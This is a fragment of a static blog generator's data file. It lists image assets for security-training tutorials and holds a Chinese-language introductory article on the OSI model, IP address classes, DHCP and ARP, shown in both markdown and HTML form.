Surface教程/chackanzhuang.png","hash":"c8d477764afe5fa9f153d33de2d2178c54d75bde","modified":1739530504768},{"_id":"public/images/lookup-教程/msf1.png","hash":"2c293cd8b8e0107dc864a8d898f9d7ebdd71e191","modified":1739530504768},{"_id":"public/images/lookup-教程/pwn.png","hash":"cc4fbc4ff9d67debd0650f21d1d55ec6bb1a86ad","modified":1739530504768},{"_id":"public/images/tryhackme-nmap基础介绍/sl ip.png","hash":"41f078b1d76a8c693249ec311592db18ae60b26a","modified":1739530504768},{"_id":"public/images/tryhackme-Tcpdump-The-Basics小介绍/htb/dns.png","hash":"a3583b96861627d2886d1fa9cb5ed31cdd5e4f53","modified":1739530504768},{"_id":"public/images/tryhackme-wireshark小tips/packet/3333.png","hash":"6d2e1a676c522b7928a1123902a40ab00f4aa0fd","modified":1739530504768},{"_id":"public/images/tryhackme-wireshark小tips/packet/destination.png","hash":"7350fe022c171f11a1f688de2fe1cd660a51cf17","modified":1739530504768},{"_id":"public/images/tryhackme-wireshark小tips/packet/point1.png","hash":"c28ad409db8f6958436516705fc49a157f33b196","modified":1739530504768},{"_id":"public/images/tryhackme-OWASP-Top-10-2021/login.png","hash":"863f9ab7d37a39ff6464ce1a24755ad1c268313a","modified":1739530504768},{"_id":"public/images/tryhackme-wireshark小tips/packet/host.png","hash":"9e30d4f37d1cb03d0bd34d5f22c1d814d062610d","modified":1739530504768},{"_id":"public/images/tryhackme-wireshark小tips/traffic/a12.png","hash":"00714913836534372a7f2d1a6c431275d44a253f","modified":1739530504768},{"_id":"public/images/tryhackme-wireshark小tips/traffic/error737.png","hash":"76cb0ec29f44ec6a2f3c29ad40b25294ad0ee0ab","modified":1739530504768},{"_id":"public/images/tryhackme-wireshark小tips/traffic/dstudp.png","hash":"c67485f7116aa53a9a85bc0c980602db72246ea9","modified":1739530504768},{"_id":"public/images/tryhackme-wireshark小tips/traffic/jizhong5.png","hash":"822f6fc8c08a5e24a378631e6e1a09526e4222f1","modified":1739530504768},{"_id":"public/images/传说中的命令行/powershell/flag1.png","hash":"8e0d7d37c7245b11d77c5cfe81d626bd6e8ddff0","modified":1739530504768},{"_id":"public/images/Linux Incident Surface教程/屏幕截图 2025-01-17 162402.png","hash":"c42c2f21bf646d8aed3279cc6498d0e889d83d12","modified":1739530504768},{"_id":"public/images/pyrat-教程/nmap.png","hash":"d0d4b93944444082c4369753452131227b260f37","modified":1739530504768},{"_id":"public/images/tryhackme-OWASP-Top-10-2021/admin.png","hash":"6b63ffbbdd7451e4ef64f3759780d2a8c4390a1d","modified":1739530504768},{"_id":"public/images/tryhackme-wireshark小tips/inzhuo.png","hash":"7d3606b988bb1e7fb77a23858b09a01d00863ce0","modified":1739530504768},{"_id":"public/images/tryhackme-wireshark小tips/packet/duihua.png","hash":"04b45caf054dc67baba484eba9e9882399a502b6","modified":1739530504768},{"_id":"public/images/tryhackme-wireshark小tips/packet/xieyi1.png","hash":"03d882bf1e58cbfa4188f125997f3e1cb6b162ff","modified":1739530504768},{"_id":"public/images/tryhackme-wireshark小tips/traffic/322.png","hash":"a1809e652d689789262ebe647a5727e2b385ae4d","modified":1739530504768},{"_id":"public/images/tryhackme-wireshark小tips/traffic/6.png","hash":"af338a6099f9020a8abcadbcf544ad00adbd3315","modified":1739530504768},{"_id":"public/images/tryhackme-wireshark小tips/traffic/chmod.png","hash":"fa939befbcdd831b69449715a04216ef86afb4d5","modified":1739530504768},{"_id":"public/images/tryhackme-wireshark小tips/traffic/udpguabi.png","hash":"ea26ada8cde9bb33c2a4939f83e4a0b56858b771","modified":1739530504768},{"_id":"public/images/Bricks-Heist-教程/wpscan3.png","hash":"a0894298116a451dd125b84cf71c335eff382d75","modified":1739530504768},{"_id":"public/images/tryhackme-wireshark小tips/secend.png","hash":"527fd2c8198a05d2544dd86f9d9ff168fc3a36df","modified":1739530504768},{"_id":"public/images/tryhackme-wireshark小tips/r4w1.png","hash":"660ebc44611bd7f3c63f67b80ce1b3a1fa9230b0","modified":1739530504768},{"_id":"public/images/tryhackme-wireshark小tips/traffic/udp1.png","hash":"e7d47c878bab7547ba40e99310607010dc41a482","modified":1739530504768},{"_id":"public/images/tryhackme-Tcpdump-The-Basics小介绍/htb/port1.png","hash":"a14f2a3fafe2b302b7da88eb5281cd080156e3d8","modified":1739530504768},{"_id":"public/images/tryhackme-wireshark小tips/packet/blicnet.png","hash":"3e205456d51f760743cf97e235926e76acac6683","modified":1739530504768},{"_id":"public/images/tryhackme-wireshark小tips/packet/city.png","hash":"10321ef22cb43f51ca728f334c56ae5f58e1835b","modified":1739530504768},{"_id":"public/images/tryhackme-wireshark小tips/packet/port80 .png","hash":"b35c3b08b7fb3ef7e23dcfe48be4904e61038446","modified":1739530504768},{"_id":"public/images/tryhackme-wireshark小tips/packet/ttl1.png","hash":"5793e88fd7c662a46233b32a7b2741b4f0434d07","modified":1739530504768},{"_id":"public/images/Linux Incident Surface教程/authcheck.png","hash":"86fe9dcbdacf7833840e5cb0c55ee41e7fa5b359","modified":1739530504768},{"_id":"public/images/tryhackme-wireshark小tips/traffic/ftp.png","hash":"a83472d7a6872d3a566e1ab6beb956287d8c1b94","modified":1739530504768},{"_id":"public/images/tryhackme-wireshark小tips/traffic/jndi1.png","hash":"7a244972064a3756c5c60877da50815db3b2b777","modified":1739530504768},{"_id":"public/images/tryhackme-wireshark小tips/packet2.png","hash":"c2d76c7b9c3fb551e933ecb7532dd35cef195e29","modified":1739530504768},{"_id":"public/images/tryhackme-wireshark小tips/packet/7.5.png","hash":"cb8bc8b06f4dd55bc90724fa84f66ff7b9a331c6","modified":1739530504768},{"_id":"public/images/Linux Incident Surface教程/journalctl.png","hash":"43ecc3d319771c2fdfa39a5669bd4d2a677000be","modified":1739530504768},{"_id":"public/images/tryhackme-wireshark小tips/traffic/a30.png","hash":"90785f3ce88f3c7ca05ed4d4264f7f54d6d5be34","modified":1739530504768},{"_id":"public/images/tryhackme-wireshark小tips/traffic/jizhong4.png","hash":"f8ec5756df2111b4fb24c2fd9f9de90750b6a4e9","modified":1739530504768},{"_id":"public/images/tryhackme-wireshark小tips/traffic/httppacket.png","hash":"eb957153bcc5399f6bc2a539a53a6b12208cb2d8","modified":1739530504768},{"_id":"public/images/tryhackme-wireshark小tips/traffic/jizhong.png","hash":"682a7c31483bd809be529f00f3c83d8c6cf65d2c","modified":1739530504768},{"_id":"public/images/Linux Incident Surface教程/catj.png","hash":"52fd1c729e9a09b5b724180c639c60e9b0cf520c","modified":1739530504768},{"_id":"public/images/tryhackme-wireshark小tips/packet/ttl.png","hash":"19a5667b5998f7e93656a3887d0fc6b2a285b49c","modified":1739530504768},{"_id":"public/images/tryhackme-Tcpdump-The-Basics小介绍/htb/port.png","hash":"930e1cb44aa4510f22e38efe53dd8d377362bc82","modified":1739530504768},{"_id":"public/images/tryhackme-wireshark小tips/guolv.png","hash":"18eea020c410de37eb6e6d262e45a8893bc72f23","modified":1739530504768},{"_id":"public/images/tryhackme-wireshark小tips/wenjian.png","hash":"b94524264fae6e6a1dc79a3fd3e4df6ac026e24c","modified":1739530504768},{"_id":"public/images/tryhackme-wireshark小tips/note0.png","hash":"317c6a8d3a9b6997df25024d81dc73dd619c6f5c","modified":1739530504768},{"_id":"public/images/tryhackme-wireshark小tips/http.png","hash":"f74bed5b05a9d458ff54807b03c3da23e5571be9","modified":1739530504768},{"_id":"public/images/tryhackme-wireshark小tips/traffic/115.png","hash":"144540217eb5a812a4788c1e1c6bf76a5f796df5","modified":1739530504768},{"_id":"public/images/tryhackme-wireshark小tips/traffic/client.png","hash":"76288e5c4a9abb54e4497b6998dc813ce8fb7e61","modified":1739530504768},{"_id":"public/images/tryhackme-wireshark小tips/traffic/http2.png","hash":"828f9ca02a8b283fc5a3f024a2025f31ad393420","modified":1739530504768},{"_id":"public/images/tryhackme-wireshark小tips/packet/ip.png","hash":"f2156a20b0eb3bb43a51e832e452a2a9763a5958","modified":1739530504768},{"_id":"public/images/tryhackme-wireshark小tips/traffic/284.png","hash":"e6948ccb3b65554d189588d39fccfa168fb51e5c","modified":1739530504768},{"_id":"public/images/tryhackme-wireshark小tips/traffic/lival.png","hash":"37b68668f19ae9f1e62eec3e00ddde668a447bea","modified":1739530504768},{"_id":"public/images/tryhackme-OWASP-Top-10-2021/assets.png","hash":"a49a9b30f8451ce787d6979099c355213604849d","modified":1739530504768},{"_id":"public/images/tryhackme-wireshark小tips/packet/dnsa.png","hash":"2b58c1d0eeda80437a396e70e09bae0bc213a22e","modified":1739530504768},{"_id":"public/images/tryhackme-wireshark小tips/packet/tcp4444.png","hash":"5888f71da77ebc00a717871d44cb3e1182f84752","modified":1739530504768},{"_id":"public/images/tryhackme-wireshark小tips/find3.png","hash":"f42169dc47e90692b534277c2e22f1a44bf50360","modified":1739530504768},{"_id":"public/images/tryhackme-wireshark小tips/packet/dnsaaaa.png","hash":"ccee8e2fbb95620a494aff119312e12a58f88afa","modified":1739530504768},{"_id":"public/images/tryhackme-wireshark小tips/traffic/ssh.png","hash":"99785a11256bfbf7dff88680e331172a37549368","modified":1739530504768},{"_id":"public/images/tryhackme-OWASP-Top-10-2021/web.png","hash":"4f80ee73c6feafdd69299c41d0cc1fa33eabe565","modified":1739530504768},{"_id":"public/images/tryhackme-wireshark小tips/packet/5.png","hash":"b056457af3dd89d2b88bd2502249fc2c8865e04c","modified":1739530504768},{"_id":"public/images/tryhackme-wireshark小tips/packet/tcp 80.png","hash":"8dc0b0451b9744edd2364495a4700db5764f6106","modified":1739530504768},{"_id":"public/images/tryhackme-wireshark小tips/traffic/data.png","hash":"decbce74c231136f6499d8b7157c0e323168abb8","modified":1739530504768},{"_id":"public/images/tryhackme-wireshark小tips/traffic/number6.png","hash":"0e65cb64af31d1d541535f6cfc9ab63e70fe9cfd","modified":1739530504768},{"_id":"public/images/Bricks-Heist-教程/brick.png","hash":"7019f723f48e39d34506fc94921cff8231391db5","modified":1739530504768}],"Category":[],"Data":[],"Page":[{"title":"books","date":"2024-12-30T07:47:34.000Z","top_img":"transparent","_content":"","source":"books/index.md","raw":"---\ntitle: books\ndate: 2024-12-30 15:47:34\ntop_img: transparent\n---\n","updated":"2024-12-30T13:37:46.658Z","path":"books/index.html","comments":1,"layout":"page","_id":"cm74njvx50000tsg6cktj8j5o","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"\\assets\\css\\APlayer.min.css\"><script src=\"\\assets\\js\\APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script>","excerpt":"","more":""},{"title":"Gallery","date":"2024-12-30T07:48:05.000Z","top_img":"transparent","_content":"","source":"Gallery/index.md","raw":"---\ntitle: Gallery\ndate: 2024-12-30 15:48:05\ntop_img: transparent\n---\n","updated":"2024-12-30T13:36:44.728Z","path":"Gallery/index.html","comments":1,"layout":"page","_id":"cm74njvx80002tsg6gr13fh0w","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"\\assets\\css\\APlayer.min.css\"><script src=\"\\assets\\js\\APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script>","excerpt":"","more":""},{"title":"about","date":"2024-12-30T07:48:16.000Z","top_img":"transparent","_content":"","source":"about/index-1.md","raw":"---\ntitle: about\ndate: 2024-12-30 15:48:16\ntop_img: transparent\n---\n","updated":"2025-02-03T09:24:42.637Z","path":"about/index-1.html","comments":1,"layout":"page","_id":"cm74njvxb0005tsg6fbisc23h","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"\\assets\\css\\APlayer.min.css\"><script src=\"\\assets\\js\\APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script>","excerpt":"","more":""},{"title":"network 网络概念","date":"2025-01-31T10:20:52.000Z","tags":"web 网络","top_img":"transparent","_content":"\n# 网络知识的介绍\n\n\n## osi七层模型\nOSI 模型是一个描述网络功能的概念框架。简单来说，OSI 模型标对计算机系统彼此之间发送信息的方式进行了标准化。\n\n分为：\n- 物理层\n- 数据链路层\n- 网络层\n- 传输层\n- 会话层\n- 表示层\n- 应用层\n\n### 物理层\n\n**物理层**（Physical Layer）是计算机网络OSI模型中**最低**的一层，也是**最基本**的一层。简单的说，网络的物理层面确保**原始的数据**可在各种**物理媒体**上**传输**。\n\n物理层规定：为传输数据，需要**物理链路**与**设备**的建立、维持、拆除，并具有**机械的**、**电子的**、**功能的**、**规范**的特性。\n\n第一层的数据单元是**比特**（bit）。\n\n#### 功能\n1. 为数据段设备提供传输数据的通路\n\n2. 传输数据\n\n#### 常见物理层设备\n- 光纤\n- CAT-5线\n- CAT-6线\n- CAT-7线\n- RJ-45接头\n- 集线器\n- 串口\n- 并口\n\n#### 编码\n- 曼彻斯特编码 \n- 差分曼彻斯特编码\n\n### 数据链路层\n数据链路层（Data Link Layer）是OSI参考模型**第二层**，位于物理层与网络层之间。可以细分成**介质访问控制（MAC）子层**和**逻辑链路控制（LLC）子层**。\n\n#### 主要功能\n数据链路层用于跨物理层在**网段节点**之间传输数据，通常指以太网、无线局域网等通信手段。数据链路层提供了在网络的两个实体之间传输数据的功能，并且提供了**差错检测**用于**纠正**物理层中发生的错误。\n\n只提供导线的一端到另一端（本质是点到点）的**数据传输**。\n\n数据链路层的以太网协议规定了一组二进制电信号为**数据帧**，数据帧的报头 head 就包含**目标 MAC 地址**和**源 MAC 地址**\n\n第二层的数据单元是 **帧**（frame）。\n\n帧都包括一个帧头 主题和一个帧尾\n\n- 帧头：源节点和目的节点的mac地址\n- 主体：要传输的比特\n- 帧尾：包括错误检测信息\n\n#### 常见数据链路层的设备\n- 网卡（物理层和数据链路层的MAC子层）\n- 交换机 是数据链路层设备。\n- 桥接器（又称网桥）\n\n#### 协议\n异步传输模式\n- VLAN（IEEE 802.1Q）\n- 以太网（IEEE 802.3）\n- Wi-Fi（IEEE 802.11）\n\n- PPP协议\n点对点协议 一种数据链路层封装协议 有PAP和CHAP两种方式\n\n- PPPoE协议\n，以太网上的点对点协议，是将点对点协议（PPP）封装在以太网（Ethernet）框架中的一种网络隧道协议。\n\n### 网络层\n网络层是**互联网通信过程**的一部分，这是连接发生的地方，在不同网络之间来回**发送数据包**来进行通信，处理不同网络之间的数据路由和发送。\n\n用于将接收到的数据段从一台计算机传输到位于不同网络中的另一台计算机。\n\n第三层的数据单元为**数据包**\n\n#### 功能\n1. 寻址\n对网络层而言使用IP地址来**唯一标识**互联网上的各个寻址，网络层依靠IP地址进行**相互通信**（类似于MAC地址），详细的编址方案参见IPv4和IPv6。\n<br>\n2. 路由\n在同一个网络中的内部通信并不需要网络层设备，仅仅靠数据链路层就可以完成相互通信，对于不同的网络之间相互通信则必须借助路由器等三层设备。\n\n#### 网络层协议\n- IP （V4、V6）\n- ICMP（V4、V6）\n- IPsec\n- RIP\n- OSPF\n\n#### 具有网络层功能的设备\n- 路由\n- 三层交换机\n\n### 传输层\n传输层通过分段、流量控制和差错控制来控制通信的可靠性。支持不同主机上运行的应用程序之间的端到端通信。\n\n第四次的数据单元可以说**报文段**或**数据段**(**tcp**)和**数据报**(**udp**)\n\n#### 协议\n- tcp\n- udp\n\n\n### 会话层\n主要利用传输层提供的端到端数据传输服务，为两个会话层实体进行**会话**（Session），而进行的对话连接的管理服务。\n\n#### 会话层服务\n- 认证\n- 权限\n- 会话恢复\n\n#### 会话层协议\n- PAP, 密码认证协议\n- PPTP, 点对点隧道协议\n- L2TP, 第二层隧道协议\n- RPC, 远程过程调用\n- SDP, 套接字直接协议\n\n### 表示层\n\n表示层向上对应用层服务，向下接受来自会话层的服务。表示层为在应用过程之间传送的信息提供表示方法的服务，它只关心信息发出的语法和语义\n\n表示层从应用层接收数据。这些数据是以字符和数字的形式出现的，表示层将这些字符和数字转换成机器可理解的二进制格式。\n\n为不同终端的上层用户提供数据和信息正确的语法表示变换方法。表示层确保数据以应用层可以理解的形式传递。处理数据编码、压缩和加密。\n\n#### 表示层的主要功能\n- 数据语法转换\n- 语法表示\n- 连接管理\n- 数据处理\n- 数据加密和解密\n- 数据压缩和解压\n- 数据编码和解码\n\n#### 表示层协议\n- HTTP/HTTPS\n- FTP/FTPS\n- SSH\n- Telnet\n- ASN.1\n\n### 应用层\n用层直接和应用程序接口结合，并提供常见的网络应用服务。应用层也向第六层表示层发出请求。\n\n应用层直接向最终用户应用程序提供网络服务。\n\n#### 协议\n- DHCP\n- DNS\n- FTP\n- POP3\n\n简单来说 假如你在给你的异地女朋友发微信信息 微信这个app就是属于**应用层** 将你发的这个信息转化为机器**能够懂的适合传输**的形式 这个就是**表示层**的作用 这个信息要发给你的女朋友 你和女朋友的微信会创建一个**会话连接** 会话层会在信息发过去的时候**保证传输**顺利进行 传输层会把数据**分成**适合传输的**数据包**进行传输 网络层会规划一条**合适的路径**传输信息 数据链路层会通过物理网络将**数据包传给**物理层 物理层就能把数据包发送到接收方手机 就能接收到发送方的信息\n\n## tcp/ip模型\n- 应用层\n- 传输层\n- 网络接口层\n- 链路层\n\n## ip地址\n由网络号和主机号组成\n\nA类地址以0开头，第一个字节作为网络号，地址范围为：0.0.0.0~127.255.255.255\n\nB类地址以10开头，前两个字节作为网络号，地址范围是：128.0.0.0~191.255.255.255\n\nC类地址以110开头，前三个字节作为网络号，地址范围是：192.0.0.0~223.255.255.255\n\nD类地址以1110开头，地址范围是224.0.0.0~239.255.255.255，D类地址作为组播地址（一对多的通信）\n\nE类地址以1111开头，地址范围是240.0.0.0~255.255.255.255，E类地址为保留地址，供以后使用。\n\n0.0.0.0用来寻找自己的ip\n\n\n### 私有地址\n- A类 10.0.0.0 - 10.255.255.255 (10/8)\n- B类 172.16.0.0 - 172.31.255.255 (172.16/12)\n- C类 192.168.0.0 - 192.168.255.255 (192.168/16)\n\n\n\n## dhcp协议\n\n动态主机配置协议 用于集中对用户IP地址进行动态管理和配置。\n\n\n### DHCP遵循四个步骤：发现、提供、请求和确认 (DORA)：\n\n- DHCP发现：客户端将广播 DHCPDISCOVER 消息，寻找本地DHCP服务器（如果存在）。\n- DHCP提供：服务器以 DHCPOFFER 消息进行响应，其中包含可供客户端接受的 IP 地址。\n- DHCP请求：客户端以 DHCPREQUEST 消息进行响应，表明它已接受提供的 IP。\n- DHCP确认：服务器以 DHCPACK 消息进行响应，以确认提供的 IP 地址现已分配给该客户端。\n\n\n## arp协议\narp协议(地址解析协议) IP地址对mac地址的映射 询问IP地址对应的mac地址\n\n目标 MAC 地址\n源 MAC 地址\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n","source":"about/network-网络概念.md","raw":"---\ntitle: network 网络概念\ndate: 2025-01-31 18:20:52\ntags: web 网络\ntop_img: transparent\n---\n\n# 网络知识的介绍\n\n\n## osi七层模型\nOSI 模型是一个描述网络功能的概念框架。简单来说，OSI 模型标对计算机系统彼此之间发送信息的方式进行了标准化。\n\n分为：\n- 物理层\n- 数据链路层\n- 网络层\n- 传输层\n- 会话层\n- 表示层\n- 应用层\n\n### 物理层\n\n**物理层**（Physical Layer）是计算机网络OSI模型中**最低**的一层，也是**最基本**的一层。简单的说，网络的物理层面确保**原始的数据**可在各种**物理媒体**上**传输**。\n\n物理层规定：为传输数据，需要**物理链路**与**设备**的建立、维持、拆除，并具有**机械的**、**电子的**、**功能的**、**规范**的特性。\n\n第一层的数据单元是**比特**（bit）。\n\n#### 功能\n1. 为数据段设备提供传输数据的通路\n\n2. 传输数据\n\n#### 常见物理层设备\n- 光纤\n- CAT-5线\n- CAT-6线\n- CAT-7线\n- RJ-45接头\n- 集线器\n- 串口\n- 并口\n\n#### 编码\n- 曼彻斯特编码 \n- 差分曼彻斯特编码\n\n### 数据链路层\n数据链路层（Data Link Layer）是OSI参考模型**第二层**，位于物理层与网络层之间。可以细分成**介质访问控制（MAC）子层**和**逻辑链路控制（LLC）子层**。\n\n#### 主要功能\n数据链路层用于跨物理层在**网段节点**之间传输数据，通常指以太网、无线局域网等通信手段。数据链路层提供了在网络的两个实体之间传输数据的功能，并且提供了**差错检测**用于**纠正**物理层中发生的错误。\n\n只提供导线的一端到另一端（本质是点到点）的**数据传输**。\n\n数据链路层的以太网协议规定了一组二进制电信号为**数据帧**，数据帧的报头 head 就包含**目标 MAC 地址**和**源 MAC 地址**\n\n第二层的数据单元是 **帧**（frame）。\n\n帧都包括一个帧头 主题和一个帧尾\n\n- 帧头：源节点和目的节点的mac地址\n- 主体：要传输的比特\n- 帧尾：包括错误检测信息\n\n#### 常见数据链路层的设备\n- 网卡（物理层和数据链路层的MAC子层）\n- 交换机 是数据链路层设备。\n- 桥接器（又称网桥）\n\n#### 协议\n异步传输模式\n- VLAN（IEEE 802.1Q）\n- 以太网（IEEE 802.3）\n- Wi-Fi（IEEE 802.11）\n\n- PPP协议\n点对点协议 一种数据链路层封装协议 有PAP和CHAP两种方式\n\n- PPPoE协议\n，以太网上的点对点协议，是将点对点协议（PPP）封装在以太网（Ethernet）框架中的一种网络隧道协议。\n\n### 网络层\n网络层是**互联网通信过程**的一部分，这是连接发生的地方，在不同网络之间来回**发送数据包**来进行通信，处理不同网络之间的数据路由和发送。\n\n用于将接收到的数据段从一台计算机传输到位于不同网络中的另一台计算机。\n\n第三层的数据单元为**数据包**\n\n#### 功能\n1. 寻址\n对网络层而言使用IP地址来**唯一标识**互联网上的各个寻址，网络层依靠IP地址进行**相互通信**（类似于MAC地址），详细的编址方案参见IPv4和IPv6。\n<br>\n2. 路由\n在同一个网络中的内部通信并不需要网络层设备，仅仅靠数据链路层就可以完成相互通信，对于不同的网络之间相互通信则必须借助路由器等三层设备。\n\n#### 网络层协议\n- IP （V4、V6）\n- ICMP（V4、V6）\n- IPsec\n- RIP\n- OSPF\n\n#### 具有网络层功能的设备\n- 路由\n- 三层交换机\n\n### 传输层\n传输层通过分段、流量控制和差错控制来控制通信的可靠性。支持不同主机上运行的应用程序之间的端到端通信。\n\n第四次的数据单元可以说**报文段**或**数据段**(**tcp**)和**数据报**(**udp**)\n\n#### 协议\n- tcp\n- udp\n\n\n### 会话层\n主要利用传输层提供的端到端数据传输服务，为两个会话层实体进行**会话**（Session），而进行的对话连接的管理服务。\n\n#### 会话层服务\n- 认证\n- 权限\n- 会话恢复\n\n#### 会话层协议\n- PAP, 密码认证协议\n- PPTP, 点对点隧道协议\n- L2TP, 第二层隧道协议\n- RPC, 远程过程调用\n- SDP, 套接字直接协议\n\n### 表示层\n\n表示层向上对应用层服务，向下接受来自会话层的服务。表示层为在应用过程之间传送的信息提供表示方法的服务，它只关心信息发出的语法和语义\n\n表示层从应用层接收数据。这些数据是以字符和数字的形式出现的，表示层将这些字符和数字转换成机器可理解的二进制格式。\n\n为不同终端的上层用户提供数据和信息正确的语法表示变换方法。表示层确保数据以应用层可以理解的形式传递。处理数据编码、压缩和加密。\n\n#### 表示层的主要功能\n- 数据语法转换\n- 语法表示\n- 连接管理\n- 数据处理\n- 数据加密和解密\n- 数据压缩和解压\n- 数据编码和解码\n\n#### 表示层协议\n- HTTP/HTTPS\n- FTP/FTPS\n- SSH\n- Telnet\n- ASN.1\n\n### 应用层\n用层直接和应用程序接口结合，并提供常见的网络应用服务。应用层也向第六层表示层发出请求。\n\n应用层直接向最终用户应用程序提供网络服务。\n\n#### 协议\n- DHCP\n- DNS\n- FTP\n- POP3\n\n简单来说 假如你在给你的异地女朋友发微信信息 微信这个app就是属于**应用层** 将你发的这个信息转化为机器**能够懂的适合传输**的形式 这个就是**表示层**的作用 这个信息要发给你的女朋友 你和女朋友的微信会创建一个**会话连接** 会话层会在信息发过去的时候**保证传输**顺利进行 传输层会把数据**分成**适合传输的**数据包**进行传输 网络层会规划一条**合适的路径**传输信息 数据链路层会通过物理网络将**数据包传给**物理层 物理层就能把数据包发送到接收方手机 就能接收到发送方的信息\n\n## tcp/ip模型\n- 应用层\n- 传输层\n- 网络接口层\n- 链路层\n\n## ip地址\n由网络号和主机号组成\n\nA类地址以0开头，第一个字节作为网络号，地址范围为：0.0.0.0~127.255.255.255\n\nB类地址以10开头，前两个字节作为网络号，地址范围是：128.0.0.0~191.255.255.255\n\nC类地址以110开头，前三个字节作为网络号，地址范围是：192.0.0.0~223.255.255.255\n\nD类地址以1110开头，地址范围是224.0.0.0~239.255.255.255，D类地址作为组播地址（一对多的通信）\n\nE类地址以1111开头，地址范围是240.0.0.0~255.255.255.255，E类地址为保留地址，供以后使用。\n\n0.0.0.0用来寻找自己的ip\n\n\n### 私有地址\n- A类 10.0.0.0 - 10.255.255.255 (10/8)\n- B类 172.16.0.0 - 172.31.255.255 (172.16/12)\n- C类 192.168.0.0 - 192.168.255.255 (192.168/16)\n\n\n\n## dhcp协议\n\n动态主机配置协议 用于集中对用户IP地址进行动态管理和配置。\n\n\n### DHCP遵循四个步骤：发现、提供、请求和确认 (DORA)：\n\n- DHCP发现：客户端将广播 DHCPDISCOVER 消息，寻找本地DHCP服务器（如果存在）。\n- DHCP提供：服务器以 DHCPOFFER 消息进行响应，其中包含可供客户端接受的 IP 地址。\n- DHCP请求：客户端以 DHCPREQUEST 消息进行响应，表明它已接受提供的 IP。\n- DHCP确认：服务器以 DHCPACK 消息进行响应，以确认提供的 IP 地址现已分配给该客户端。\n\n\n## arp协议\narp协议(地址解析协议) IP地址对mac地址的映射 询问IP地址对应的mac地址\n\n目标 MAC 地址\n源 MAC 地址\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n","updated":"2025-02-03T01:40:38.998Z","path":"about/network-网络概念.html","comments":1,"layout":"page","_id":"cm74njvxc0007tsg6ghce4sog","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"\\assets\\css\\APlayer.min.css\"><script src=\"\\assets\\js\\APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><h1 id=\"网络知识的介绍\"><a href=\"#网络知识的介绍\" class=\"headerlink\" title=\"网络知识的介绍\"></a>网络知识的介绍</h1><h2 id=\"osi七层模型\"><a href=\"#osi七层模型\" class=\"headerlink\" title=\"osi七层模型\"></a>osi七层模型</h2><p>OSI 模型是一个描述网络功能的概念框架。简单来说，OSI 模型标对计算机系统彼此之间发送信息的方式进行了标准化。</p>\n<p>分为：</p>\n<ul>\n<li>物理层</li>\n<li>数据链路层</li>\n<li>网络层</li>\n<li>传输层</li>\n<li>会话层</li>\n<li>表示层</li>\n<li>应用层</li>\n</ul>\n<h3 id=\"物理层\"><a href=\"#物理层\" class=\"headerlink\" title=\"物理层\"></a>物理层</h3><p><strong>物理层</strong>（Physical Layer）是计算机网络OSI模型中<strong>最低</strong>的一层，也是<strong>最基本</strong>的一层。简单的说，网络的物理层面确保<strong>原始的数据</strong>可在各种<strong>物理媒体</strong>上<strong>传输</strong>。</p>\n<p>物理层规定：为传输数据，需要<strong>物理链路</strong>与<strong>设备</strong>的建立、维持、拆除，并具有<strong>机械的</strong>、<strong>电子的</strong>、<strong>功能的</strong>、<strong>规范</strong>的特性。</p>\n<p>第一层的数据单元是<strong>比特</strong>（bit）。</p>\n<h4 id=\"功能\"><a href=\"#功能\" class=\"headerlink\" title=\"功能\"></a>功能</h4><ol>\n<li><p>为数据段设备提供传输数据的通路</p>\n</li>\n<li><p>传输数据</p>\n</li>\n</ol>\n<h4 id=\"常见物理层设备\"><a href=\"#常见物理层设备\" class=\"headerlink\" title=\"常见物理层设备\"></a>常见物理层设备</h4><ul>\n<li>光纤</li>\n<li>CAT-5线</li>\n<li>CAT-6线</li>\n<li>CAT-7线</li>\n<li>RJ-45接头</li>\n<li>集线器</li>\n<li>串口</li>\n<li>并口</li>\n</ul>\n<h4 id=\"编码\"><a href=\"#编码\" class=\"headerlink\" title=\"编码\"></a>编码</h4><ul>\n<li>曼彻斯特编码 </li>\n<li>差分曼彻斯特编码</li>\n</ul>\n<h3 id=\"数据链路层\"><a href=\"#数据链路层\" class=\"headerlink\" title=\"数据链路层\"></a>数据链路层</h3><p>数据链路层（Data Link Layer）是OSI参考模型<strong>第二层</strong>，位于物理层与网络层之间。可以细分成<strong>介质访问控制（MAC）子层</strong>和<strong>逻辑链路控制（LLC）子层</strong>。</p>\n<h4 id=\"主要功能\"><a href=\"#主要功能\" class=\"headerlink\" title=\"主要功能\"></a>主要功能</h4><p>数据链路层用于跨物理层在<strong>网段节点</strong>之间传输数据，通常指以太网、无线局域网等通信手段。数据链路层提供了在网络的两个实体之间传输数据的功能，并且提供了<strong>差错检测</strong>用于<strong>纠正</strong>物理层中发生的错误。</p>\n<p>只提供导线的一端到另一端（本质是点到点）的<strong>数据传输</strong>。</p>\n<p>数据链路层的以太网协议规定了一组二进制电信号为<strong>数据帧</strong>，数据帧的报头 head 就包含<strong>目标 MAC 地址</strong>和<strong>源 MAC 地址</strong></p>\n<p>第二层的数据单元是 <strong>帧</strong>（frame）。</p>\n<p>帧都包括一个帧头 主题和一个帧尾</p>\n<ul>\n<li>帧头：源节点和目的节点的mac地址</li>\n<li>主体：要传输的比特</li>\n<li>帧尾：包括错误检测信息</li>\n</ul>\n<h4 id=\"常见数据链路层的设备\"><a href=\"#常见数据链路层的设备\" class=\"headerlink\" title=\"常见数据链路层的设备\"></a>常见数据链路层的设备</h4><ul>\n<li>网卡（物理层和数据链路层的MAC子层）</li>\n<li>交换机 是数据链路层设备。</li>\n<li>桥接器（又称网桥）</li>\n</ul>\n<h4 id=\"协议\"><a href=\"#协议\" class=\"headerlink\" title=\"协议\"></a>协议</h4><p>异步传输模式</p>\n<ul>\n<li><p>VLAN（IEEE 802.1Q）</p>\n</li>\n<li><p>以太网（IEEE 802.3）</p>\n</li>\n<li><p>Wi-Fi（IEEE 802.11）</p>\n</li>\n<li><p>PPP协议<br>点对点协议 一种数据链路层封装协议 